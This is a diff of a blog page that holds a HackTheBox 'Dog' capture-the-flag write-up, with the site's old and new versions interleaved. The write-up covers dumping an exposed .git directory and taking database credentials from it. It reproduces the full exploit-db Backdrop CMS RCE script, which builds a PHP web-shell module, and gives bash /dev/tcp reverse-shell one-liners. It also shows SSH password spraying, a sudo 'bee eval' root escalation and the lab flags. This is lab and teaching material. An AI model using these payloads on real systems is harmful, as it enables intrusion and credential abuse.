$HOME gets replaced by its value. copy The bee command has an eval subcommand that allows us to execute arbitrary PHP code. To use it correctly, we need to specify the --root parameter pointing to the web root (/var/www/html). We can use this to spawn a root shell.\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval \"system('/bin/bash -i');\" root@dog:/var/www/html# copy Or, if you need a reverse shell back to your machine (replace and ): 0xblivion@fluffy: ~ johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval \\ \"system('bash -i \u003e\u0026 /dev/tcp// 0\u003e\u00261');\" copy Get the root.txt 0xblivion@fluffy: ~ root@dog:/var/www/html# id uid=0(root) gid=0(root) groups=0(root) root@dog:/var/www/html# cat /root/root.txt 83970a2d7e6797bf5f32b7a915dad3f7 copy Root flag: 83970a2d7e6797bf5f32b7a915dad3f7\n",
-  "wordCount" : "2832",
+  "articleBody": "Overview Dog is an easy box from HackTheBox that focuses on web application vulnerabilities, specifically a misconfigured Git repository and a vulnerable Backdrop CMS. We start by discovering an exposed .git directory, which allows us to dump the repository and uncover database credentials. These credentials lead to an authenticated web panel, where we exploit a known Remote Code Execution (RCE) vulnerability in Backdrop CMS to gain an initial shell as www-data. For privilege escalation, we discover that a user (johncusack) can execute a PHP utility (bee) as root, which we then abuse to spawn a root shell.\nTarget IP 10.10.11.58 + − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Access .git Directory [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Extract settings.php → DB Creds [https://i.ibb.co/HDPF8ZMm/website-removebg-preview-1.png]Login as CMS User [https://i.ibb.co/ksTD4Kyw/bug-malicious-removebg-preview.png]Upload Malicious Module (RCE) [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Trigger Web Shell (www-data) [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Password Spray SSH Users [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]SSH as johncusack [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Run `sudo bee` to Eval PHP [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]Gain Root Access 1. Reconnaissance (TA0043) 1.1. Network Scanning (T1595) As always, we start with an nmap scan to see what services are running on the target. 0xblivion@fluffy: ~ root@0xblivion:~# sudo nmap -sVC -oA nmap/dog 10.10.11.58 -vv # Nmap 7.95 scan initiated Wed Jul 2 16:25:44 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/dog -vv 10.10.11.58 Nmap scan report for 10.10.11.58 Host is up, received echo-reply ttl 63 (0.055s latency). Scanned at 2025-07-02 16:25:44 EDT for 9s Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8= | 256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y= | 256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-git: | 10.10.11.58:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... |_ Last commit message: todo: customize url aliases. reference:https://docs.backdro... |_http-generator: Backdrop CMS 1 (https://backdropcms.org) |_http-title: Home | Dog | http-robots.txt: 22 disallowed entries | /core/ /profiles/ /README.md /web.config /admin | /comment/reply /filter/tips /node/add /search /user/register | /user/password /user/login /user/logout /?q=admin /?q=comment/reply | /?q=filter/tips /?q=node/add /?q=search /?q=user/password |_/?q=user/register /?q=user/login /?q=user/logout |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Jul 2 16:25:53 2025 -- 1 IP address (1 host up) scanned in 9.54 seconds copy From the Nmap output, we see an open SSH port (22/tcp) and an HTTP server (80/tcp) running Apache. The HTTP server reveals a .git/ directory, which is a big deal, and also identifies the web application as Backdrop CMS.\n2. Initial Access (TA0001) 2.1. Web Enumeration and Git Exposure (T1590) We’ll run gobuster in the background to discover more directories and files on the web server. 0xblivion@fluffy: ~ root@0xblivion:~# gobuster dir -u http://10.10.11.58/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.58/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-medium-words.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /modules (Status: 301) [Size: 312] [--\u003e http://10.10.11.58/modules/] /.php (Status: 403) [Size: 276] /.html (Status: 403) [Size: 276] /themes (Status: 301) [Size: 311] [--\u003e http://10.10.11.58/themes/] /.htm (Status: 403) [Size: 276] /files (Status: 301) [Size: 310] [--\u003e http://10.10.11.58/files/] /sites (Status: 301) [Size: 310] [--\u003e http://10.10.11.58/sites/] /core (Status: 301) [Size: 309] [--\u003e http://10.10.11.58/core/] /.htaccess (Status: 403) [Size: 276] /.phtml (Status: 403) [Size: 276] /layouts (Status: 301) [Size: 312] [--\u003e http://10.10.11.58/layouts/] /.htc (Status: 403) [Size: 276] /.html_var_DE (Status: 403) [Size: 276] /server-status (Status: 403) [Size: 276] /.htpasswd (Status: 403) [Size: 276] /.git (Status: 301) [Size: 309] [--\u003e http://10.10.11.58/.git/] /.html. (Status: 403) [Size: 276] /.html.html (Status: 403) [Size: 276] /.htpasswds (Status: 403) [Size: 276] /.htm. (Status: 403) [Size: 276] /.htmll (Status: 403) [Size: 276] /.phps (Status: 403) [Size: 276] /.html.old (Status: 403) [Size: 276] /.ht (Status: 403) [Size: 276] /.html.bak (Status: 403) [Size: 276] /.htm.htm (Status: 403) [Size: 276] /.hta (Status: 403) [Size: 276] /.htgroup (Status: 403) [Size: 276] /.html1 (Status: 403) [Size: 276] /.html.LCK (Status: 403) [Size: 276] /.html.printable (Status: 403) [Size: 276] /.htm.LCK (Status: 403) [Size: 276] /.htaccess.bak (Status: 403) [Size: 276] /.html.php (Status: 403) [Size: 276] /.htmls (Status: 403) [Size: 276] /.htx (Status: 403) [Size: 276] /.htlm (Status: 403) [Size: 276] /.htm2 (Status: 403) [Size: 276] /.html- (Status: 403) [Size: 276] /.htuser (Status: 403) [Size: 276] /.htacess (Status: 403) [Size: 276] /.htm.d (Status: 403) [Size: 276] /.htm.html (Status: 403) [Size: 276] /.htm.old (Status: 403) [Size: 276] /.html-1 (Status: 403) [Size: 276] /.html.orig (Status: 403) [Size: 276] /.html.sav (Status: 403) [Size: 276] /.html_ (Status: 403) [Size: 276] /.html_files (Status: 403) [Size: 276] /.htmlpar (Status: 403) [Size: 276] /.htmlprint (Status: 403) [Size: 276] /.hts (Status: 403) [Size: 276] Progress: 63088 / 63089 (100.00%) =============================================================== Finished =============================================================== copy The gobuster scan confirms the presence of the .git directory, which was also found by Nmap. Since Backdrop CMS is open-source, we’ll focus on the .git directory for potential information disclosure.\nWe’ll use git-dumper to extract the contents of the .git repository from the web server.\n0xblivion@fluffy: ~ root@0xblivion:~# mkdir git-dump; git-dumper http://10.10.11.58/ git-dump/ [~] Testing http://10.10.11.58/.git/HEAD [200] [~] Testing http://10.10.11.58/.git/ [200] [~] Fetching .git recursively [~] Fetching http://10.10.11.58/.gitignore [404] [~] http://10.10.11.58/.gitignore responded with status code 404 [~] Fetching http://10.10.11.58/.git/ [200] [~] Fetching http://10.10.11.58/.git/objects/ [200] [~] Fetching http://10.10.11.58/.git/HEAD [200] [~] Fetching http://10.10.11.58/.git/COMMIT_EDITMSG [200] [~] Fetching http://10.10.11.58/.git/config [200] [~] Fetching http://10.10.11.58/.git/branches/ [200] [~] Fetching http://10.10.11.58/.git/hooks/ [200] [~] Fetching http://10.10.11.58/.git/description [200] [~] Fetching http://10.10.11.58/.git/logs/ [200] [~] Fetching http://10.10.11.58/.git/refs/ [200] ...SNIP.. copy 2.2. Credential Discovery from Git (T1555) Within the dumped .git repository, I found a settings.php file in the root directory that contains database credentials. 0xblivion@fluffy: ~ root@0xblivion:~# head -n 16 settings.php \u003c?php /** * @file * Main Backdrop CMS configuration file. */ /** * Database configuration: * * Most sites can configure their database by entering the connection string * below. If using primary/replica databases or multiple connections, see the * advanced database documentation at * https://api.backdropcms.org/database-configuration */ $database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop'; $database_prefix = ''; copy The credentials found are root:BackDropJ2024DS2024.\nI tried to log in to the website’s admin panel using these credentials, but root was not a valid username.\n2.3. Finding a Valid User I used grep to recursively search for strings containing dog.htb within the dumped Git repository, hoping to find valid usernames.\n0xblivion@fluffy: ~ root@0xblivion:~# grep -Ri dog.htb files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json: \"tiffany@dog.htb\" .git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root 1738963331 +0000 commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases .git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root 1738963331 +0000 commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases copy We found a potential username: tiffany@dog.htb.\n0xblivion@fluffy: ~ root@0xblivion:~# echo \"10.10.11.58 dog.htb\" | sudo tee -a /etc/hosts copy Using tiffany as the username and BackDropJ2024DS2024 as the password, I was able to log into the Backdrop CMS admin panel.\n2.4. Authenticated RCE in Backdrop CMS (T1190) Now that we have authenticated access to the Backdrop CMS admin panel, we’ll look for a way to gain a shell. I searched for exploits related to “Backdrop CMS” and found an authenticated RCE exploit on exploit-db.\nhttps://www.exploit-db.com/exploits/52021 The exploit script generates a malicious module (shell.zip) that can be uploaded to the CMS.\n#!/usr/bin/env python3 # Exploit Title: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE) # Date: 04/27/2024 # Exploit Author: Ahmet Ümit BAYRAM # Vendor Homepage: https://backdropcms.org/ # Software Link: https://github.com/backdrop/backdrop/releases/download/1.27.1/backdrop.zip # Version: latest # Tested on: MacOS import os import time import zipfile def create_files(): info_content = \"\"\" type = module name = Block description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page. package = Layouts tags[] = Blocks tags[] = Site Architecture version = BACKDROP_VERSION backdrop = 1.x configure = admin/structure/block ; Added by Backdrop CMS packaging script on 2024-03-07 project = backdrop version = 1.27.1 timestamp = 1709862662 \"\"\" shell_info_path = \"shell/shell.info\" os.makedirs(os.path.dirname(shell_info_path), exist_ok=True) # Klasörüoluşturur with open(shell_info_path, \"w\") as file: file.write(info_content) shell_content = \"\"\" \u003c?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?\u003e \"\"\" shell_php_path = \"shell/shell.php\" with open(shell_php_path, \"w\") as file: file.write(shell_content) return shell_info_path, shell_php_path def create_zip(info_path, php_path): zip_filename = \"shell.zip\" with zipfile.ZipFile(zip_filename, 'w') as zipf: zipf.write(info_path, arcname='shell/shell.info') zipf.write(php_path, arcname='shell/shell.php') return zip_filename def main(url): print(\"Backdrop CMS 1.27.1 - Remote Command Execution Exploit\") time.sleep(3) print(\"Evil module generating...\") time.sleep(2) info_path, php_path = create_files() zip_filename = create_zip(info_path, php_path) print(\"Evil module generated!\", zip_filename) time.sleep(2) print(\"Go to \" + url + \"/admin/modules/install and upload the \" + zip_filename + \" for Manual Installation.\") time.sleep(2) print(\"Your shell address:\", url + \"/modules/shell/shell.php\") if __name__ == \"__main__\": import sys if len(sys.argv) \u003c 2: print(\"Usage: python script.py [url]\") else: main(sys.argv[1]) Running the Python script: 0xblivion@fluffy: ~ root@0xblivion:~# ./exploit.py http://10.10.11.58/ Backdrop CMS 1.27.1 - Remote Command Execution Exploit Evil module generating... Evil module generated! shell.zip Go to http://10.10.11.58//admin/modules/install and upload the shell.zip for Manual Installation. Your shell address: http://10.10.11.58//modules/shell/shell.php copy The script instructs us to upload shell.zip via the “Manual Installation” option in the CMS admin panel (http://dog.htb/admin/modules/install).\nFunctionality \u003e Install new modules \u003e Manual Installation\nHowever, the CMS only accepts .tar.gz files for manual installation. We need to compress the shell/ directory generated by the script into a .tar.gz archive.\n0xblivion@fluffy: ~ root@0xblivion:~# tar -czf shell.tar.gz shell/ root@0xblivion:~# ls shell shell.tar.gz shell.zip exploit.py git-dump copy Now, we can upload shell.tar.gz through the “Manual installation” page.\nAfter successful installation, I can access my web shell at http://dog.htb/modules/shell/shell.php.\nThe web shell confirms we are running as the www-data user. We’ll use a reverse shell to get a more stable connection.\nbash -c 'bash -i \u003e\u0026 /dev/tcp// 0\u003e\u00261' On our attacking machine, we set up a netcat listener: 0xblivion@fluffy: ~ root@0xblivion:~# nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.15.7] from (UNKNOWN) [10.10.11.58] 54688 bash: cannot set terminal process group (929): Inappropriate ioctl for device bash: no job control in this shell www-data@dog:/var/www/html/modules/shell$ copy We upgrade the shell to an interactive TTY: 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ script -q /dev/null -c bash copy Then, CTRL+Z to background the shell, followed by stty raw -echo; fg and pressing Enter twice. 0xblivion@fluffy: ~ stty raw -echo; fg [2] - continued nc -lnvp 9001 www-data@dog:/var/www/html/modules/shell$ copy We also adjust the TTY dimensions for better usability:\n0xblivion@fluffy: ~ root@0xblivion:~# stty -a speed 38400 baud; rows 45; columns 238; line = 0; intr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = ; eol2 = ; swtch = ; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0; -parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts -ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8 opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0 isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc copy 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ stty rows 45 cols 238 copy Actually, you don’t need to do this step since you can just find a user through the webshell. 3. Privilege Escalation (TA0004) 3.1. User Enumeration and Lateral Movement via SSH (T1021.004) Now that we have a stable shell, we enumerate local users on the system. 0xblivion@fluffy: ~ www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash jobert:x:1000:1000:jobert:/home/jobert:/bin/bash johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash copy We found three users with shell access: root, jobert, and johncusack. We’ll save these usernames to users.txt.\nI used netexec to spray the database password (BackDropJ2024DS2024) against these users for SSH: 0xblivion@fluffy: ~ root@0xblivion:~# nxc ssh 10.10.11.58 -u users.txt -p 'BackDropJ2024DS2024' --continue-on-success SSH 10.10.11.58 22 10.10.11.58 [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.12 SSH 10.10.11.58 22 10.10.11.58 [-] jobert:BackDropJ2024DS2024 SSH 10.10.11.58 22 10.10.11.58 [+] johncusack:BackDropJ2024DS2024 Linux - Shell access! copy The johncusack user’s password is BackDropJ2024DS2024. I can now SSH into the box as johncusack.\n0xblivion@fluffy: ~ root@0xblivion:~# ssh johncusack@dog.htb The authenticity of host 'dog.htb (10.10.11.58)' can't be established. ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o. This host key is known by the following other names/addresses: ~/.ssh/known_hosts:6: [hashed name] Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'dog.htb' (ED25519) to the list of known hosts. johncusack@dog.htb's password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Wed 02 Jul 2025 09:26:21 PM UTC System load: 0.0 Usage of /: 50.9% of 6.32GB Memory usage: 26% Swap usage: 0% Processes: 244 Users logged in: 0 IPv4 address for eth0: 10.10.11.58 IPv6 address for eth0: dead:beef::250:56ff:feb0:b9d2 Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Mar 4 17:04:29 2025 from 10.10.15.7 johncusack@dog:~$ copy We are now logged in as johncusack. We can find the user flag in the home directory. 0xblivion@fluffy: ~ johncusack@dog:~$ ls user.txt johncusack@dog:~$ cat user.txt d305454bc5a53fb01aec080ec3a2ee33 copy User flag: d305454bc5a53fb01aec080ec3a2ee33 3.2. Sudo Abuse for Root (T1548.003) I check sudo -l to see what commands johncusack can run with sudo privileges.\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo -l [sudo] password for johncusack: Matching Defaults entries for johncusack on dog: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User johncusack may run the following commands on dog: (ALL : ALL) /usr/local/bin/bee copy The user johncusack can execute /usr/local/bin/bee as root. I inspect the bee file.\n0xblivion@fluffy: ~ johncusack@dog:~$ file /usr/local/bin/bee /usr/local/bin/bee: symbolic link to /backdrop_tool/bee/bee.php copy It’s a symbolic link to /backdrop_tool/bee/bee.php. We can view the contents of bee.php:\n#!/usr/bin/env php \u003c?php /** * @file * A command line utility for Backdrop CMS. */ // Exit gracefully with a meaningful message if installed within a web // accessible location and accessed in the browser. if (!bee_is_cli()) { echo bee_browser_load_html(); die(); } // Set custom error handler. set_error_handler('bee_error_handler'); // Include files. require_once __DIR__ . '/includes/miscellaneous.inc'; require_once __DIR__ . '/includes/command.inc'; require_once __DIR__ . '/includes/render.inc'; require_once __DIR__ . '/includes/filesystem.inc'; require_once __DIR__ . '/includes/input.inc'; require_once __DIR__ . '/includes/globals.inc'; // Main execution code. bee_initialize_server(); bee_parse_input(); bee_initialize_console(); bee_process_command(); bee_print_messages(); bee_display_output(); exit(); /** * Custom error handler for `bee`. * * @param int $error_level * The level of the error. * @param string $message * Error message to output to the user. * @param string $filename * The file that the error came from. * @param int $line * The line number the error came from. * @param array $context * An array of all variables from where the error was triggered. * * @see https://www.php.net/manual/en/function.set-error-handler.php * @see _backdrop_error_handler() */ function bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) { require_once __DIR__ . '/includes/errors.inc'; _bee_error_handler_real($error_level, $message, $filename, $line, $context); } /** * Detects whether the current script is running in a command-line environment. */ function bee_is_cli() { return (empty($_SERVER['SERVER_SOFTWARE']) \u0026\u0026 (php_sapi_name() == 'cli' || (is_numeric($_SERVER['argc']) \u0026\u0026 $_SERVER['argc'] \u003e 0))); } /** * Return the HTML to display if this page is loaded in the browser. * * @return string * The concatentated html to display. */ function bee_browser_load_html() { // Set the title to use in h1 and title elements. $title = \"Bee Gone!\"; // Place a white block over \"#!/usr/bin/env php\" as this is output before // anything else. $browser_output = \"\u0026nbsp;\"; // Add the bee logo and style appropriately. $browser_output .= \"\"; // Add meaningful text. $browser_output .= \"$title\"; $browser_output .= \"Bee is a command line tool only and will not work in the browser.\n\"; // Add the document title using javascript when the window loads. $browser_output .= \"\"; // Output the combined string. return $browser_output; } I check the bee command’s eval functionality:\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo bee help eval eval, ev, php-eval Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop. Arguments: code The PHP code to evaluate. Examples: bee eval '$node = node_load(1); print $node-\u003etitle;' Loads node with nid 1 and then prints its title. bee eval \"node_access_rebuild();\" Rebuild node access permissions. bee eval \"file_unmanaged_copy('$HOME/Pictures/image.jpg', 'public://image.jpg');\" Copies a file whose path is determined by an environment's variable. Note the use of double quotes so the variable $HOME gets replaced by its value. copy The bee command has an eval subcommand that allows us to execute arbitrary PHP code. To use it correctly, I need to specify the --root parameter pointing to the web root (/var/www/html). I can use this to spawn a root shell.\n0xblivion@fluffy: ~ johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval \"system('/bin/bash -i');\" root@dog:/var/www/html# copy Or, if you need a reverse shell back to your machine (replace and ): 0xblivion@fluffy: ~ johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval \\ \"system('bash -i \u003e\u0026 /dev/tcp// 0\u003e\u00261');\" copy Get the root.txt 0xblivion@fluffy: ~ root@dog:/var/www/html# id uid=0(root) gid=0(root) groups=0(root) root@dog:/var/www/html# cat /root/root.txt 83970a2d7e6797bf5f32b7a915dad3f7 copy Root flag: 83970a2d7e6797bf5f32b7a915dad3f7 ",
+  "wordCount" : "2853",
   "inLanguage": "en",
-  "image": "https://0xblivion.dev/img/favicon.png","datePublished": "2025-03-28T00:00:00Z",
-  "dateModified": "2025-03-28T00:00:00Z",
+  "image": "https://0xblivion.dev/img/favicon.png","datePublished": "2025-07-12T00:00:00Z",
+  "dateModified": "2025-07-12T00:00:00Z",
   "author":{
     "@type": "Person",
     "name": "0xblivion"
   },
   "mainEntityOfPage": {
     "@type": "WebPage",
-    "@id": "http://localhost:1313/posts/htb/linux/easy/hackthebox---dog-writeup/"
+    "@id": "https://0xblivion.dev/posts/htb/linux/easy/hackthebox---dog-writeup/"
   },
   "publisher": {
     "@type": "Organization",
     "name": "0xblivion.dev",
     "logo": {
       "@type": "ImageObject",
-      "url": "http://localhost:1313/favicon.ico"
+      "url": "https://0xblivion.dev/favicon.ico"
     }
   }
 }
@@ -133,7 +133,7 @@ This box focuses on web application vulnerabilities, specifically a misconfigure
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="0xblivion.dev (Alt + H)">0xblivion.dev</a>
+            <a href="https://0xblivion.dev/" accesskey="h" title="0xblivion.dev (Alt + H)">0xblivion.dev</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -159,17 +159,17 @@ This box focuses on web application vulnerabilities, specifically a misconfigure
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/" title="Home">
+                <a href="https://0xblivion.dev/" title="Home">
                     <span>Home</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/about/" title="About">
+                <a href="https://0xblivion.dev/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                <a href="https://0xblivion.dev/search/" title="Search (Alt &#43; /)" accesskey=/>
                     <span>Search</span>
                 </a>
             </li>
@@ -180,11 +180,11 @@ This box focuses on web application vulnerabilities, specifically a misconfigure
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="https://0xblivion.dev/">Home</a>&nbsp;»&nbsp;<a href="https://0xblivion.dev/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       HackTheBox - Dog Writeup
     </h1>
-    <div class="post-meta"><span title='2025-03-28 00:00:00 +0000 UTC'>March 28, 2025</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;0xblivion
+    <div class="post-meta"><span title='2025-07-12 00:00:00 +0000 UTC'>July 12, 2025</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;0xblivion
 
 </div>
   </header> <div class="toc">
@@ -195,50 +195,142 @@ This box focuses on web application vulnerabilities, specifically a misconfigure
 
         <div class="inner"><ul>
                 <li>
-                    <a href="#overview" aria-label="Overview">Overview</a><ul>
+                    <a href="#overview" aria-label="Overview">Overview</a></li>
+                <li>
+                    <a href="#1-reconnaissance-ta0043" aria-label="1. Reconnaissance (TA0043)">1. Reconnaissance (TA0043)</a><ul>
                         <ul>
                         
                 <li>
-                    <a href="#test-attack-path-lang-to-d" aria-label="TEST ATTACK PATH LANG TO :D">TEST ATTACK PATH LANG TO :D</a></li></ul>
+                    <a href="#11-network-scanning-t1595" aria-label="1.1. Network Scanning (T1595)">1.1. Network Scanning (T1595)</a></li></ul>
                     </ul>
                 </li>
                 <li>
-                    <a href="#1-kicking-off-with-nmap" aria-label="1. Kicking Off with Nmap">1. Kicking Off with Nmap</a></li>
-                <li>
-                    <a href="#2-enumeration" aria-label="2. Enumeration">2. Enumeration</a><ul>
+                    <a href="#2-initial-access-ta0001" aria-label="2. Initial Access (TA0001)">2. Initial Access (TA0001)</a><ul>
                         <ul>
                         
                 <li>
-                    <a href="#dumping-git-using-git-dumper" aria-label="Dumping .git/ using git-dumper">Dumping .git/ using git-dumper</a></li>
+                    <a href="#21-web-enumeration-and-git-exposure-t1590" aria-label="2.1. Web Enumeration and Git Exposure (T1590)">2.1. Web Enumeration and Git Exposure (T1590)</a></li>
                 <li>
-                    <a href="#db-password" aria-label="DB Password">DB Password</a></li>
+                    <a href="#22-credential-discovery-from-git-t1555" aria-label="2.2. Credential Discovery from Git (T1555)">2.2. Credential Discovery from Git (T1555)</a></li>
                 <li>
-                    <a href="#finding-a-valid-user" aria-label="Finding a valid user">Finding a valid user</a></li></ul>
+                    <a href="#23-finding-a-valid-user" aria-label="2.3. Finding a Valid User">2.3. Finding a Valid User</a></li>
+                <li>
+                    <a href="#24-authenticated-rce-in-backdrop-cms-t1190" aria-label="2.4. Authenticated RCE in Backdrop CMS (T1190)">2.4. Authenticated RCE in Backdrop CMS (T1190)</a></li></ul>
                     </ul>
                 </li>
                 <li>
-                    <a href="#3-foothold-and-user-flag" aria-label="3. Foothold and User flag">3. Foothold and User flag</a><ul>
+                    <a href="#3-privilege-escalation-ta0004" aria-label="3. Privilege Escalation (TA0004)">3. Privilege Escalation (TA0004)</a><ul>
                         <ul>
                         
                 <li>
-                    <a href="#exploit" aria-label="Exploit">Exploit</a></li></ul>
-                    </ul>
-                </li>
+                    <a href="#31-user-enumeration-and-lateral-movement-via-ssh-t1021004" aria-label="3.1. User Enumeration and Lateral Movement via SSH (T1021.004)">3.1. User Enumeration and Lateral Movement via SSH (T1021.004)</a></li>
                 <li>
-                    <a href="#4-privilege-escalation-to-root" aria-label="4. Privilege Escalation to Root">4. Privilege Escalation to Root</a>
+                    <a href="#32-sudo-abuse-for-root-t1548003" aria-label="3.2. Sudo Abuse for Root (T1548.003)">3.2. Sudo Abuse for Root (T1548.003)</a>
                 </li>
+            </ul>
+            </ul>
+            </li>
             </ul>
         </div>
     </details>
 </div>
 
   <div class="post-content"><h1 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h1>
-<p><img alt="Dog card" loading="lazy" src="/img/dog/Dog.png"></p>
